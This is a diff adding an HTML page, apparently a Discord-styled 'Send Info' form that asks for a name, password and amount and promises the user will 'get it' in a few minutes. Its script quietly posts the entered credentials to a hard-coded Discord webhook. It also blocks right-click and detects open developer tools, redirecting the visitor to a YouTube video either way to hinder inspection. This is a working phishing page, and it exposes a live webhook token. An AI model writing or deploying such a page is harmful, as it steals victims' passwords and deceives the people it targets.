@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Send Info</title>
+
+<style>
+body{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  background:#2b2d31;
+  font-family:Arial;
+}
+
+.box{
+  background:#1e1f22;
+  padding:40px;
+  border-radius:10px;
+  text-align:center;
+  color:white;
+}
+
+input{
+  padding:10px;
+  width:220px;
+  border:none;
+  border-radius:6px;
+  margin-bottom:15px;
+}
+
+button{
+  padding:12px 25px;
+  background:#5865F2;
+  border:none;
+  border-radius:6px;
+  color:white;
+  font-size:16px;
+  cursor:pointer;
+}
+
+button:hover{
+  background:#4752c4;
+}
+
+#status{
+  margin-top:15px;
+  color:red;
+  font-weight:bold;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+<h2>Send Info</h2>
+
+<input id="username" type="text" placeholder="Name"><br>
+<input id="password" type="text" placeholder="Password"><br>
+<input id="amount" type="text" placeholder="Amount"><br>
+<button onclick="send()">Send</button>
+
+<p id="status"></p>
+</div>
+
+<script>
+// Send input values to Discord webhook
+function send(){
+  let username = document.getElementById("username").value;
+  let password = document.getElementById("password").value;
+  let amount = document.getElementById("amount").value;
+
+  let msg = `Name: ${username}\nPassword: ${password}\nAmount: ${amount}`;
+
+  fetch("https://discord.com/api/webhooks/1481002558695669912/3QmMwvISWqW74jd2PpzH9Bs-z8xKXPXr08op7tC5NejVe8wpJfxktaJKlHewoVU1b8J3", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ content: msg })
+  });
+
+  // Clear inputs
+  document.getElementById("username").value = "";
+  document.getElementById("password").value = "";
+  document.getElementById("amount").value = "";
+
+  // Show red status message
+  document.getElementById("status").textContent = "Wait a few minutes to get it";
+}
+
+// Block right-click and redirect
+document.addEventListener("contextmenu", function(e) {
+  e.preventDefault();
+  window.location.href = "https://www.youtube.com/shorts/QWbRqEHH5Ng";
+});
+
+// Detect DevTools / Inspect Element and redirect
+setInterval(function() {
+  if (window.outerWidth - window.innerWidth > 160 || 
+      window.outerHeight - window.innerHeight > 160) {
+      window.location.href = "https://www.youtube.com/shorts/QWbRqEHH5Ng";
+  }
+}, 1000);
+</script>
+
+</body>
+</html>
